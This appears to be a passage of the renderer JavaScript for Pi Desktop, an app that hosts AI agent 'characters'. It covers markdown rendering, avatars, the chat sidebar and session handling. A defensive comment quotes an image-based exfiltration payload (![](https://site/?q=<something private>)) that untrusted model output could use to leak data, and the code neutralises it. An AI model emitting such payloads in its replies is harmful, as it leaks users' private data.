// Pi Desktop renderer. All agent state lives in the Pi child processes; this file only
// mirrors their event streams into DOM, one `per[harnessId]` record per character.
const $ = (s, r = document) => r.querySelector(s);
// DOM append/replaceChildren stringify null; let render code pass optional children freely.
for (const fn of ["append", "replaceChildren"]) {
  const orig = Element.prototype[fn];
  Element.prototype[fn] = function (...kids) { return orig.apply(this, kids.flat().filter((k) => k != null && k !== false)); };
}
const h = (tag, attrs = {}, ...kids) => {
  const el = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (v == null || v === false) continue;
    if (k === "class") el.className = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else if (k === "html") el.innerHTML = v;
    else el.setAttribute(k, v === true ? "" : v);
  }
  for (const c of kids.flat()) if (c != null && c !== false) el.append(c.nodeType ? c : String(c));
  return el;
};
const svg = (d, vb = "0 0 20 20") => { const t = document.createElement("template"); t.innerHTML = `<svg viewBox="${vb}">${d}</svg>`; return t.content.firstChild; };
const ICON = {
  chev: '<path d="M8 5l5 5-5 5"/>',
  term: '<rect x="3" y="4" width="14" height="12" rx="2.5"/><path d="M6.5 8.5 9 10.5l-2.5 2M10.5 13h3"/>',
  file: '<path d="M6 3h5l4 4v9.5a1.5 1.5 0 0 1-1.5 1.5h-7A1.5 1.5 0 0 1 5 16.5v-12A1.5 1.5 0 0 1 6 3z"/><path d="M11 3v4h4"/>',
  pen: '<path d="M4 16h3l8.5-8.5a2.1 2.1 0 0 0-3-3L4 13v3z"/>',
  search: '<circle cx="9" cy="9" r="5"/><path d="M13 13l4 4"/>',
  globe: '<circle cx="10" cy="10" r="7"/><path d="M3 10h14M10 3c2.2 2.4 2.2 11.6 0 14M10 3c-2.2 2.4-2.2 11.6 0 14"/>',
  spark: '<path d="M10 3v4M10 13v4M3 10h4M13 10h4M5.5 5.5l2 2M12.5 12.5l2 2M14.5 5.5l-2 2M7.5 12.5l-2 2"/>',
  brain: '<path d="M7.5 4.5a2.5 2.5 0 0 0-2.5 2.5 2.5 2.5 0 0 0-1 4.5 2.5 2.5 0 0 0 3.5 3.5h.5V4.5zM12.5 4.5A2.5 2.5 0 0 1 15 7a2.5 2.5 0 0 1 1 4.5 2.5 2.5 0 0 1-3.5 3.5H12V4.5z"/>',
  ask: '<circle cx="10" cy="10" r="7"/><path d="M8 8a2 2 0 1 1 2.8 1.8c-.5.3-.8.7-.8 1.2v.5M10 14h.01"/>',
  folder: '<path d="M3 6a1.5 1.5 0 0 1 1.5-1.5h3l1.5 2h6.5A1.5 1.5 0 0 1 17 8v6.5a1.5 1.5 0 0 1-1.5 1.5h-11A1.5 1.5 0 0 1 3 14.5z"/>',
  ring: (p) => `<circle cx="10" cy="10" r="7" stroke-opacity=".25"/><circle cx="10" cy="10" r="7" stroke-dasharray="${(p * 44).toFixed(1)} 44" transform="rotate(-90 10 10)"/>`,
};
const strip = (s) => String(s ?? "").replace(/\x1b\[[0-9;?]*[ -\/]*[@-~]/g, "").replace(/\x1b\][^\x07]*\x07/g, "");
const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]);
const textOf = (c) => (typeof c === "string" ? c : Array.isArray(c) ? c.filter((b) => b.type === "text").map((b) => b.text).join("\n") : "");

const S = { activeChat: {}, threads: {}, info: {}, showAll: new Set(), chars: [], byId: {}, active: null, user: "", home: "", per: {}, panelOpen: false, panelTab: null, openFolds: new Set(), search: "" };
// Chats run side by side (one Pi process each, like Codex). S.per[key] is one chat; each character
// remembers its active chat in S.activeChat[harness]; the sidebar list lives in S.threads[harness].
let chatSeq = 0;
function newChatState(harness) {
  const key = `${harness}~${Date.now().toString(36)}${(chatSeq++).toString(36)}`;
  S.per[key] = {
    key, harness, msgs: [], results: {}, streaming: false, started: false, sessionFile: null, sessionName: "",
    model: null, defaultModel: null, thinking: null, levels: [], statuses: {}, widgets: {}, queue: { steering: [], followUp: [] },
    commands: [], unread: false, startedAt: 0, ctx: null, attachments: [], lastUsed: Date.now(), livePromise: null,
  };
  // Until this chat's own Pi process is up, borrow what another chat of the same harness already learned.
  const info = S.info[harness];
  if (info) Object.assign(S.per[key], { commands: info.commands || [], levels: info.levels || [], defaultModel: info.defaultModel || null, model: info.model || null, thinking: info.thinking || null });
  return key;
}
// Before the first character is selected (S.active unset), events like scroll/focus get an inert placeholder chat.
const BOOT_CHAT = () => (S.per.__boot ||= { key: "__boot", harness: null, msgs: [], results: {}, streaming: false, started: false, unread: false, attachments: [], commands: [], levels: [], statuses: {}, widgets: {}, queue: { steering: [], followUp: [] }, lastUsed: 0, sessionFile: null });
const CK = (harness = S.active) => !harness ? BOOT_CHAT().key : (S.activeChat[harness] && S.per[S.activeChat[harness]] ? S.activeChat[harness] : (S.activeChat[harness] = newChatState(harness)));
const P = (key = CK()) => S.per[key] || S.per[CK()];
const TH = (harness = S.active) => (S.threads[harness] ||= []);
const chatsOf = (harness) => Object.values(S.per).filter((c) => c.harness === harness);
// Character-level summary for dots/badges: any of its chats busy / unread / running.
const charState = (harness) => { const cs = chatsOf(harness); return { streaming: cs.some((c) => c.streaming), unread: cs.some((c) => c.unread), started: cs.some((c) => c.started) }; };
const C = (id = S.active) => S.byId[id];

// ---------- markdown ----------
marked.use({ gfm: true, breaks: false });
// Model output is untrusted. No styles or forms (they could restyle or spoof the app), and no remote images:
// a reply like ![](https://site/?q=<something private>) would send data out the moment it renders. The CSP
// blocks those loads too; here they become a link you can choose to open.
const PURIFY = { FORBID_TAGS: ["style", "form", "input", "button", "textarea", "select", "option"], FORBID_ATTR: ["style"] };
function md(text) {
  const el = h("div", { class: "md" });
  el.innerHTML = DOMPurify.sanitize(marked.parse(text || ""), PURIFY);
  for (const img of el.querySelectorAll("img")) {
    const src = img.getAttribute("src") || "";
    if (!/^(https?:)?\/\//i.test(src)) continue;
    let host = src; try { host = new URL(src, "https://x").host; } catch {}
    img.replaceWith(h("a", { href: src, class: "remote-img", title: src }, `Image from ${host}`));
  }
  for (const code of el.querySelectorAll("pre code")) {
    if (window.hljs && code.textContent.length < 20000) { try { hljs.highlightElement(code); } catch {} }
  }
  for (const pre of el.querySelectorAll("pre")) {
    pre.append(h("button", { class: "copy", onclick: (e) => { navigator.clipboard.writeText(pre.querySelector("code")?.innerText || pre.innerText); e.target.textContent = "Copied"; setTimeout(() => (e.target.textContent = "Copy"), 1200); } }, "Copy"));
  }
  return el;
}
document.addEventListener("click", (e) => {
  const a = e.target.closest("a[href]");
  if (!a || a.closest("#panel iframe")) return;
  e.preventDefault();
  const href = a.getAttribute("href");
  if (/^https?:/.test(href)) window.open(href);
  else if (href.startsWith("/") || href.startsWith("file:")) openFile(href.replace(/^file:\/\//, ""));
});

// ---------- avatars ----------
// Characters without a sprite get a generated, mirror-symmetric pixel face in their accent.
function genSprite(ch) {
  let seed = 0; for (const c of ch.id) seed = (seed * 33 + c.charCodeAt(0)) >>> 0;
  const rnd = () => ((seed = (seed * 1103515245 + 12345) >>> 0) >>> 8) / 16777216;
  const rows = [];
  for (let y = 0; y < 10; y++) {
    const half = [];
    for (let x = 0; x < 5; x++) half.push(y === 0 || y === 9 ? "." : rnd() < 0.55 ? (rnd() < 0.18 ? "d" : "a") : ".");
    rows.push((half.join("") + [...half].reverse().join("")));
  }
  rows[4] = rows[4].slice(0, 2) + "e" + rows[4].slice(3, 7) + "e" + rows[4].slice(8); // eyes
  return { rows, palette: { a: ch.accent, d: "#ffffff55", e: "#111" }, generated: true };
}
function drawSprite(cv, sp, blink) {
  const g = cv.getContext("2d");
  g.clearRect(0, 0, cv.width, cv.height);
  const skin = sp.palette.s || sp.palette.a;
  sp.rows.forEach((row, y) => [...row].forEach((k, x) => {
    const col = blink && (k === "e" || k === "p") ? skin : sp.palette[k];
    if (col) { g.fillStyle = col; g.fillRect(x, y, 1, 1); }
  }));
}
// Each blinker is a canvas (sprite) or a portrait box with a closed-eyes <img class="shut">.
const blinkers = new Set();
setInterval(() => {
  for (const el of blinkers) {
    if (!el.isConnected) { blinkers.delete(el); continue; }
    if (Math.random() >= 0.35) continue;
    if (el._sp) { drawSprite(el, el._sp, true); setTimeout(() => drawSprite(el, el._sp, false), 140); }
    else { el.classList.add("blink"); setTimeout(() => el.classList.remove("blink"), 150); }
  }
}, 2600);
function avatar(ch, size = 24, radius, { blink = false } = {}) {
  const box = h("div", { class: "av", style: `width:${size}px;height:${size}px;${radius != null ? `border-radius:${radius}px` : ""}` });
  if (ch?.imageUrl) {
    box.style.background = `radial-gradient(circle at 50% 35%, color-mix(in srgb, ${ch.accent} 22%, #1e1e1e), #161616)`;
    box.append(h("img", { class: ch.pixel ? "pix" : "", src: ch.imageUrl, draggable: "false" }));
    if (ch.imageBlinkUrl) { box.append(h("img", { class: "shut" + (ch.pixel ? " pix" : ""), src: ch.imageBlinkUrl, draggable: "false" })); if (blink) blinkers.add(box); }
    return box;
  }
  const sp = ch?.spriteData || (ch._gen ||= genSprite(ch));
  const w = Math.max(...sp.rows.map((r) => r.length)), hgt = sp.rows.length;
  const cv = h("canvas", { width: w, height: hgt });
  cv._sp = sp;
  drawSprite(cv, sp, false);
  if (sp.generated) { cv.style.padding = Math.round(size * 0.14) + "px"; box.style.background = `color-mix(in srgb, ${ch.accent} 16%, #1b1b1b)`; }
  else box.style.background = "#1e1e1e";
  if (blink) blinkers.add(cv);
  box.append(cv);
  return box;
}
function hue(id) { let n = 0; for (const c of id) n = (n * 31 + c.charCodeAt(0)) % 360; return `hsl(${n} 62% 66%)`; }

// ---------- boot ----------
async function boot() {
  const init = await desk.init();
  S.chars = init.characters; S.user = init.user; S.home = init.home; S.providers = init.modelProviders || []; S.memory = init.memory; S.charDir = init.charDir;
  S.cfg = await desk.config();
  S.usage = await desk.usage();
  for (const c of S.chars) { c.accent ||= hue(c.id); S.byId[c.id] = c; }
  if (!S.chars.length) return renderWelcome();
  desk.onEvent(({ id, ev }) => { if (S.per[id]) onEvent(id, ev); });
  desk.onExit(({ id, code, closed, stderr }) => {
    const p = S.per[id]; if (!p) return;
    p.started = false; p.streaming = false; p.livePromise = null;
    if (code !== 0 && !closed) p.crashed = { code, stderr: strip(stderr).slice(-600) };
    // Questions from a dead process can never be answered: drop them so later dialogs aren't blocked.
    const showing = dialogQueue[0]?.id === id;
    for (let i = dialogQueue.length - 1; i >= 0; i--) if (dialogQueue[i].id === id) dialogQueue.splice(i, 1);
    if (showing) showDialog();
    renderChars(); if (id === CK()) { renderDock(); renderCrash(); }
  });
  desk.onLesson(({ path }) => { if (C()?.panel === "learning") { openPanel("lesson"); showLesson(path); } refreshTopics(); });
  desk.onFocusCharacter((id) => selectCharacter(id));
  desk.onFocusChat(async ({ harness, key }) => { await selectCharacter(harness); if (S.per[key]) activateChat(key); });
  setInterval(reapChats, 30000);
  await loadTasks();
  const start = S.byId[init.startCharacter] || S.byId[localStorage.lastChar] || S.byId[init.defaultCharacter] || S.chars[0];
  await selectCharacter(start.id);
}

// ---------- first run: no characters yet ----------
// Shown instead of the chat when the harness folder has no pi-* scripts, so a fresh install says what to do next.
async function renderWelcome() {
  document.body.classList.add("welcome");
  const st = await desk.setupStatus();
  const code = (t) => h("code", { class: "cmd", title: "Click to copy", onclick: (e) => copyText(t, e.currentTarget) }, t);
  const step = (ok, title, ...body) => h("li", { class: ok ? "ok" : "" }, h("span", { class: "tick" }, ok ? "✓" : ""), h("div", {}, h("b", {}, title), h("div", { class: "sub" }, ...body)));
  const addBtn = h("button", { class: "btn primary", onclick: async () => {
    addBtn.disabled = true;
    const r = await desk.setupAddExamples();
    if (r.error) { addBtn.disabled = false; return toast(r.error, "error"); }
    toast(`Added ${r.added.filter((x) => !x.kept).length} example characters to ${st.harnessDir}`);
    desk.setupReload();
  } }, "Add the example characters");
  $("#hero").replaceChildren(h("div", { class: "welcome-card" },
    h("h1", {}, "Welcome to Pi Desktop"),
    h("p", { class: "sub" }, `Every pi-<name> script in ${st.harnessDir} becomes a character with its own face and chats. There are none yet.`),
    h("ol", { class: "steps" },
      step(!!st.pi, st.pi ? "Pi is installed" : "Install Pi",
        ...(st.pi ? [st.pi] : [code("npm install -g @earendil-works/pi-coding-agent"), " then run ", code("pi"), " once in a terminal and log in to a model provider."])),
      step(false, "Add characters",
        "Start with three simple examples (Pi, Scout, Quill), or install the character pack (Andrej, Ilya, History, Ali, Narges) from a terminal: ",
        code(`cd ${st.repo} && scripts/install-pack.sh all`), ". Your own: ", code("scripts/new-character.sh <id>"), ".")),
    h("div", { class: "welcome-actions" }, addBtn, h("button", { class: "btn", onclick: () => desk.setupReload() }, "Reload")),
    h("p", { class: "fh" }, "Harness scripts somewhere else? Set harnessDir in config.json (see README), then Reload.")));
}

// ---------- sidebar: profile switcher (bottom-left) ----------
const dotFor = (c) => { const p = charState(c.id); return h("span", { class: "dot " + (p.streaming ? "busy" : p.unread ? "unread" : p.started ? "on" : ""), style: `--c:${c.accent}` }); };
const chatTitle = (c) => TH(c.harness).find((t) => t.file === c.sessionFile)?.title || textOf(c.msgs.find((m) => m.role === "user")?.content).replace(/\s+/g, " ").slice(0, 60) || "New chat";
function renderChars() {
  const ch = C(); if (!ch) return;
  updateBadge();
  // Every chat that is replying or has finished since you looked, across all characters: this is the "running instances" view.
  const busy = Object.values(S.per).filter((c) => c.key !== CK() && (c.streaming || c.unread)).sort((a, b) => (b.streaming - a.streaming) || (b.lastUsed - a.lastUsed));
  const strip = busy.length ? h("div", { class: "activity" },
    ...busy.slice(0, 4).map((c) => h("button", { class: "act-row " + (c.streaming ? "live" : "done"), "data-fast": true, title: chatTitle(c), onclick: () => openChatKey(c.key) },
      avatar(C(c.harness), 22, 7),
      h("span", { class: "meta" }, h("span", { class: "nm" }, C(c.harness).name), h("span", { class: "tg" }, c.streaming ? "working…" : "finished · " + chatTitle(c))),
      h("span", { class: "st" }, c.streaming ? h("i", { class: "spin" }) : svg('<path d="M5 10.5l3.2 3.2L15 6.8"/>')))),
    busy.length > 4 ? h("div", { class: "act-more" }, `+${busy.length - 4} more`) : null) : null;
  $("#sideFoot").replaceChildren(strip, h("button", { class: "profile", "data-pop": "switcher", "data-fast": true, title: "Switch character (⌘K)", onclick: (e) => switcher(e.currentTarget) },
    avatar(ch, 34, 10, { blink: true }),
    h("span", { class: "meta" }, h("span", { class: "nm" }, ch.name), h("span", { class: "tg" }, "pi " + ch.id)),
    svg('<path d="M6 8l4-4 4 4M6 12l4 4 4-4"/>')));
}
// Switcher order: characters in use right now first, then your most used (recent use counts more), then the rest A-Z.
function charGroups() {
  const live = (c) => { const st = charState(c.id); return st.streaming || st.unread || chatsOf(c.id).some((x) => x.started && x.msgs.length); };
  const score = (c) => { const u = S.usage?.[c.id]; return u ? u.n * Math.pow(0.5, (Date.now() - u.last) / (14 * 864e5)) : 0; };
  const pinned = S.chars.filter((c) => c.pinTop);                       // "pinTop": true in a character file: always first, never scrolled to
  const active = S.chars.filter((c) => live(c) && !c.pinTop).sort((a, b) => (charState(b.id).streaming - charState(a.id).streaming) || score(b) - score(a));
  const pool = S.chars.filter((c) => !active.includes(c) && !c.pinTop);
  const popular = pool.filter((c) => score(c) >= 1).sort((a, b) => score(b) - score(a)).slice(0, 5);
  const rest = pool.filter((c) => !popular.includes(c)).sort((a, b) => a.name.localeCompare(b.name));
  return { pinned, active, popular, rest, flat: [...pinned, ...active, ...popular, ...rest] };
}
function switcher(anchor) {
  popover(anchor, (pop) => {
    const search = h("input", { placeholder: "Switch character…", spellcheck: "false" });
    const list = h("div");
    const draw = () => {
      const q = search.value.toLowerCase();
      const g = charGroups(), order = g.flat;
      const ok = (c) => !q || `${c.name} ${c.id} ${c.tagline || ""}`.toLowerCase().includes(q);
      const row = (c) => { const i = order.indexOf(c); return h("button", { "data-fast": true, class: "mi char-mi" + (c.id === S.active ? " sel" : ""), onclick: () => { closePopover(); selectCharacter(c.id); } },
        avatar(c, 28, 8), h("span", { class: "meta" }, h("span", { class: "k" }, c.name), h("span", { class: "d" }, c.tagline || c.description || "")),
        dotFor(c), i < 9 ? h("kbd", {}, "⌘" + (i + 1)) : null); };
      const sect = (title, arr) => { const x = arr.filter(ok); return x.length ? [h("div", { class: "grp" }, title), ...x.map(row)] : []; };
      list.replaceChildren(...sect("Pinned", g.pinned), ...sect("In use now", g.active), ...sect("Most used", g.popular), ...sect(g.pinned.length || g.active.length || g.popular.length ? "Everyone else" : "Characters", g.rest));
    };
    search.addEventListener("input", draw);
    search.addEventListener("keydown", (e) => { if (e.key === "Enter") list.querySelector(".mi")?.click(); });
    pop.append(search, list); draw();
    setTimeout(() => search.focus(), 0);
  }, { key: "switcher", cls: "switcher" });
}

function dayLabel(ms) {
  const d = new Date(ms), now = new Date(), one = 864e5;
  const start = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
  if (ms >= start) return "Today";
  if (ms >= start - one) return "Yesterday";
  if (ms >= start - 7 * one) return "Previous 7 days";
  if (ms >= start - 30 * one) return "Previous 30 days";
  return d.toLocaleDateString(undefined, { month: "long", year: "numeric" });
}
async function refreshThreads(id = S.active) {
  S.threads[id] = await desk.sessions(id);
  if (id === S.active) renderThreads();
}
function renderThreads() {
  const nav = $("#threads"); nav.replaceChildren();
  const p = P(), q = S.search.toLowerCase().trim();
  const match = (t) => !q || t.title.toLowerCase().includes(q) || (t.snippet || "").includes(q);
  const live = TH().filter((t) => !t.archived && match(t)), archived = TH().filter((t) => t.archived && match(t));
  if (!live.length && !archived.length) { nav.append(h("div", { class: "th-empty" }, q ? "No matching chats" : `No chats with ${C().name} yet`)); return; }
  // Chats open in this app that Pi hasn't written to disk yet (new chats) still show up, like Codex.
  const unsaved = chatsOf(S.active).filter((c) => c.msgs.length && !TH().some((t) => t.file === c.sessionFile) && (!q || textOf(c.msgs.find((m) => m.role === "user")?.content).toLowerCase().includes(q)));
  if (unsaved.length) {
    nav.append(h("div", { class: "th-group" }, "Active"));
    for (const c of unsaved) {
      const title = textOf(c.msgs.find((m) => m.role === "user")?.content).replace(/\s+/g, " ").slice(0, 80) || "New chat";
      nav.append(h("div", { "data-fast": true, class: "th" + (c.key === CK() ? " active" : "") + (c.streaming ? " live" : c.unread ? " unread" : ""), title, onclick: () => activateChat(c.key) },
        h("span", { class: "tt" }, title), h("span", { class: "th-state" })));
    }
  }
  const pinned = live.filter((t) => t.pinned), rest = live.filter((t) => !t.pinned);
  if (pinned.length) { nav.append(h("div", { class: "th-group" }, "Pinned")); pinned.forEach((t) => nav.append(threadRow(t))); }
  let last = "";
  for (const t of rest) {
    const g = dayLabel(t.mtime);
    if (g !== last) { nav.append(h("div", { class: "th-group" }, g)); last = g; }
    nav.append(threadRow(t));
  }
  if (archived.length) {
    nav.append(h("button", { class: "th-group th-toggle", onclick: () => { S.showArchived = !S.showArchived; renderThreads(); } }, `${S.showArchived ? "▾" : "▸"} Archived (${archived.length})`));
    if (S.showArchived) archived.forEach((t) => nav.append(threadRow(t)));
  }
}
function threadRow(t) {
  const p = P();
  if (S.renaming === t.file) {
    const inp = h("input", { class: "th-rename", value: t.title, spellcheck: "false" });
    const done = async (save) => {
      if (S.renaming !== t.file) return;
      S.renaming = null;
      if (save && inp.value.trim() && inp.value.trim() !== t.title) await renameThread(t, inp.value.trim());
      renderThreads();
    };
    inp.addEventListener("keydown", (e) => { if (e.key === "Enter") done(true); if (e.key === "Escape") done(false); e.stopPropagation(); });
    inp.addEventListener("blur", () => done(true));
    setTimeout(() => { inp.focus(); inp.select(); }, 0);
    return inp;
  }
  const owner = chatFor(t.file) || chatsOf(S.active).find((c) => c.sessionFile === t.file);
  const row = h("div", { "data-fast": true, class: "th" + (t.file === p.sessionFile ? " active" : "") + (t.archived ? " archived" : "") + (owner?.streaming ? " live" : owner?.unread ? " unread" : "") + (t.interrupted && !owner?.streaming ? " cut" : ""), title: t.title,
    onclick: () => openSession(t.file), oncontextmenu: (e) => { e.preventDefault(); threadMenu(t, null, e); } },
    t.pinned ? h("span", { class: "pin" }, svg('<path d="M7 3h6l-1 5 3 3H5l3-3zM10 11v6"/>')) : null,
    h("span", { class: "tt" }, t.title),
    h("span", { class: "th-state" }),
    t.interrupted && !owner?.streaming ? h("button", { class: "th-continue", title: "This chat stopped before it finished. Continue where it left off.", onclick: (e) => { e.stopPropagation(); continueChat(t); } }, "Continue") : null,
    h("button", { class: "th-more", title: "More", onclick: (e) => { e.stopPropagation(); threadMenu(t, e.currentTarget); } }, svg('<circle cx="5" cy="10" r="1.2"/><circle cx="10" cy="10" r="1.2"/><circle cx="15" cy="10" r="1.2"/>')));
  return row;
}
// A chat that stopped mid-work (app closed, process killed, connection dropped): open it and tell the agent to carry on.
async function continueChat(t) {
  await openSession(t.file);
  if (P().sessionFile !== t.file || P().streaming) return;
  input.value = "Your last turn was interrupted before it finished. Pick up exactly where you left off and carry on.";
  autosize(); send();
}
function menuAt(anchor, ev, build) {
  if (anchor) return popover(anchor, build, { below: true });
  const fake = { getBoundingClientRect: () => ({ left: ev.clientX, top: ev.clientY + 4, bottom: ev.clientY + 4, right: ev.clientX }) };
  popover(fake, build, { below: true });
}
function threadMenu(t, anchor, ev) {
  menuAt(anchor, ev, (pop) => {
    const item = (label, icon, fn, cls) => h("button", { class: "mi" + (cls ? " " + cls : ""), onclick: () => { closePopover(); fn(); } }, svg(icon), h("span", { class: "k" }, label));
    pop.append(
      item(t.pinned ? "Unpin" : "Pin", '<path d="M7 3h6l-1 5 3 3H5l3-3zM10 11v6"/>', async () => { await desk.threadMeta(t.file, { pinned: !t.pinned }); refreshThreads(); }),
      item("Rename", ICON.pen, () => { S.renaming = t.file; renderThreads(); }),
      item(t.archived ? "Unarchive" : "Archive", '<rect x="3" y="4" width="14" height="4" rx="1"/><path d="M4.5 8v7.5A1.5 1.5 0 0 0 6 17h8a1.5 1.5 0 0 0 1.5-1.5V8M8 11h4"/>', () => archiveThread(t, !t.archived)),
      item("Export as HTML", '<path d="M10 3v10M6 9l4 4 4-4M4 16h12"/>', () => exportThread(t)),
      item("Copy as Markdown", '<rect x="7" y="7" width="9" height="10" rx="1.5"/><path d="M13 7V5.5A1.5 1.5 0 0 0 11.5 4h-6A1.5 1.5 0 0 0 4 5.5v7A1.5 1.5 0 0 0 5.5 14H7"/>', () => copyThreadMarkdown(t)),
      h("div", { class: "msep" }),
      item("Delete", '<path d="M4 6h12M8 6V4h4v2M6 6l1 11h6l1-11"/>', () => deleteThread(t), "danger"));
  });
}
const chatFor = (file) => chatsOf(S.active).find((c) => c.sessionFile === file && c.started);
async function renameThread(t, title) {
  await desk.threadMeta(t.file, { title });
  const owner = chatFor(t.file);
  if (owner) await desk.cmd(owner.key, { type: "set_session_name", name: title });
  await refreshThreads(); renderCrumb();
}
async function archiveThread(t, archived) {
  await desk.threadMeta(t.file, { archived, pinned: archived ? false : t.pinned });
  if (archived && t.file === P().sessionFile && !P().streaming) await newChat();
  await refreshThreads();
  toast(archived ? `Archived “${t.title.slice(0, 40)}”` : "Restored to chats");
}
async function deleteThread(t) {
  if (!t) return toast("That chat isn't in the list anymore.", "warning");
  const ok = await confirmModal({ title: "Delete chat?", body: `“${t.title.slice(0, 80)}” will be moved to the Trash. You can restore it from there.`, confirm: "Move to Trash", danger: true });
  if (!ok) return;
  const owner = chatsOf(S.active).find((c) => c.sessionFile === t.file);
  if (owner?.streaming) return toast(`${C().name} is still working in this chat. Stop it first.`, "warning");
  if (owner) {
    if (owner.key === CK()) newChat(); // switches at once; don't wait for its Pi process to boot before deleting
    if (owner.started) await desk.closeChat(owner.key);
    delete S.per[owner.key];
  }
  const r = await desk.trashThread(t.file);
  if (r?.error) return toast(r.error, "error");
  await refreshThreads();
  toast("Moved to Trash");
}
async function exportThread(t) {
  const p = P();
  if (t && t.file !== p.sessionFile) { await openSession(t.file); if (P().sessionFile !== t.file) return; }
  if (!P().msgs.length) return toast("Nothing to export yet.", "warning");
  await live(CK());
  // Pi writes relative paths into the harness folder; export to ~/Downloads instead, named after the chat.
  const title = (TH().find((x) => x.file === P().sessionFile)?.title || "chat").replace(/[^\w\- ]+/g, "").trim().slice(0, 60) || "chat";
  const out = `${S.home}/Downloads/${C().name} - ${title}.html`;
  const r = await desk.cmd(CK(), { type: "export_html", outputPath: out });
  if (!r.success) return toast(r.error, "error");
  toast(`Exported to Downloads`);
  desk.openExport(r.data.path);
}
async function copyThreadMarkdown(t) {
  const r = await desk.copyMarkdown(t.file);
  if (r?.error) return toast(r.error, "warning");
  toast("Copied chat as Markdown");
}
$("#threadSearch").addEventListener("input", (e) => { S.search = e.target.value; renderThreads(); });

// ---------- character / session switching ----------
// An empty chat has nothing to resume, so its Pi process is closed the moment you leave it.
function leaveChat(key) {
  const p = S.per[key]; if (!p || p.key === "__boot" || p.streaming || p.msgs.length || p.attachments?.length) return;
  if (p.started) desk.closeChat(key);
  delete S.per[key]; if (S.activeChat[p.harness] === key) delete S.activeChat[p.harness];
}
async function selectCharacter(id) {
  const ch = C(id); if (!ch) return;
  if (S.active && S.active !== id) leaveChat(CK());
  S.active = id; localStorage.lastChar = id;
  const p = P(CK(id)); p.unread = false; p.lastUsed = Date.now();
  const root = document.documentElement.style;
  root.setProperty("--accent", ch.accent); root.setProperty("--accent2", ch.accent2 || "#7fd3ff"); root.setProperty("--accent3", ch.accent3 || "#7ee2b8");
  desk.setCharacter(id);
  $("#input").placeholder = ch.placeholder || `Message ${ch.name}…`;
  document.body.classList.remove("swap"); void document.body.offsetWidth; document.body.classList.add("swap");
  S.panelOpen = localStorage["panel:" + id] === "1" || (!!ch.panelOpen && localStorage["panel:" + id] === undefined); S.courseTopic = null; S.taskForm = null;
  S.filePreview = null; S.editing = null; S.renaming = null; S.fsDir = null; S.mem = null;
  showChat();
  refreshThreads(id);
  // No Pi process is started here: it starts when you focus or type in the message box (see below).
}

// Show the active chat of the active character (after a switch, open, or new chat).
function showChat() {
  $("#working").replaceChildren();
  renderChars(); renderAll(); renderPanel(); renderCrash();
}
function activateChat(key) {
  const p = S.per[key]; if (!p) return;
  if (CK() !== key) leaveChat(CK());
  S.activeChat[p.harness] = key; p.unread = false; p.lastUsed = Date.now();
  S.editing = null;
  showChat(); scrollBottom(true);
}

// A chat's Pi process is started on demand (first keystroke, send, or a picker), not when you merely look
// at it: history is read straight from the session file. live(key) is safe to call any number of times.
function live(key) {
  const p = S.per[key]; if (!p) return Promise.resolve();
  if (p.started && p.livePromise) return p.livePromise;
  p.livePromise = startChat(key, p.sessionFile);
  return p.livePromise;
}
async function startChat(key, sessionFile) {
  const p = S.per[key];
  p.started = true; p.crashed = null; renderChars();
  let st = await desk.ensure(key, p.harness, sessionFile || undefined);
  // Another chat already runs this file: this chat takes over that process's key instead of starting a second one.
  if (st.alias) { rekeyChat(key, st.alias); key = st.alias; }
  if (st.defaultModel) p.defaultModel = st.defaultModel;
  await syncState(key);
  if (!p.msgs.length || sessionFile) await loadMessages(key, true);
  const cmds = await desk.cmd(key, { type: "get_commands" });
  p.commands = cmds.success ? cmds.data.commands : [];
  const lv = await desk.cmd(key, { type: "get_available_thinking_levels" });
  p.levels = lv.success ? lv.data.levels : [];
  const info = (S.info[p.harness] ||= {});
  info.commands = p.commands; info.levels = p.levels; info.defaultModel = p.defaultModel || info.defaultModel;
  if (!sessionFile && p.model) { info.model = p.model; info.thinking = p.thinking; } // a fresh chat shows the harness default
  if (key === CK()) renderDock();
}

// Point a chat at another process key (two chats on one session file share one Pi process).
function rekeyChat(oldKey, newKey) {
  const p = S.per[oldKey]; if (!p || oldKey === newKey) return;
  delete S.per[oldKey]; p.key = newKey; S.per[newKey] = p;
  if (S.activeChat[p.harness] === oldKey) S.activeChat[p.harness] = newKey;
  for (const d of dialogQueue) if (d.id === oldKey) d.id = newKey;
}
async function syncState(key) {
  const p = S.per[key]; if (!p || !p.started) return;
  const r = await desk.cmd(key, { type: "get_state" });
  if (!r.success) return;
  const d = r.data;
  p.model = d.model; p.thinking = d.thinkingLevel; p.sessionFile = d.sessionFile; p.sessionName = d.sessionName || "";
  if (key === CK()) { renderDock(); renderCrumb(); renderThreads(); }
}

function indexResults(p) { p.results = {}; for (const m of p.msgs) if (m.role === "toolResult") p.results[m.toolCallId] = m; }
// quiet = history is already on screen (read from the file); only redraw if Pi's version differs.
async function loadMessages(key, quiet = false) {
  const p = S.per[key]; if (!p) return;
  const r = await desk.cmd(key, { type: "get_messages" });
  if (!r.success) return;
  if (quiet && (p.streaming || p.msgs.some((m) => m.pending))) return;
  const changed = r.data.messages.length !== p.msgs.length;
  p.msgs = r.data.messages; indexResults(p);
  if (key === CK() && (!quiet || changed)) renderAll();
  updateCtx(key);
}

// Open a chat from the list. Already open (maybe still replying)? Just switch to it. Otherwise its history is read
// straight from the file and shown at once; its own Pi process starts only when you use it. Whatever was
// running elsewhere keeps running.
async function openSession(file) {
  const harness = S.active, cur = P();
  const open = chatsOf(harness).find((c) => c.sessionFile === file);
  if (open) { if (open.key !== cur.key) activateChat(open.key); return; }
  const key = newChatState(harness);
  const p = S.per[key];
  p.sessionFile = file; p.lastUsed = Date.now();
  const hist = await desk.history(file);
  if (hist?.messages) {
    p.msgs = hist.messages; indexResults(p);
    const lastA = [...p.msgs].reverse().find((m) => m.role === "assistant" && m.model);
    if (lastA) { const known = S.info[harness]?.model; p.model = known && known.id === lastA.model ? known : { provider: lastA.provider, id: lastA.model, name: lastA.model }; }
  }
  // An empty, idle, unsent chat is simply replaced.
  const dropEmpty = !cur.msgs.length && !cur.streaming && !cur.attachments.length ? cur.key : null;
  S.activeChat[harness] = key;
  showChat(); scrollBottom(true);
  if (dropEmpty) { if (cur.started) desk.closeChat(dropEmpty); delete S.per[dropEmpty]; }
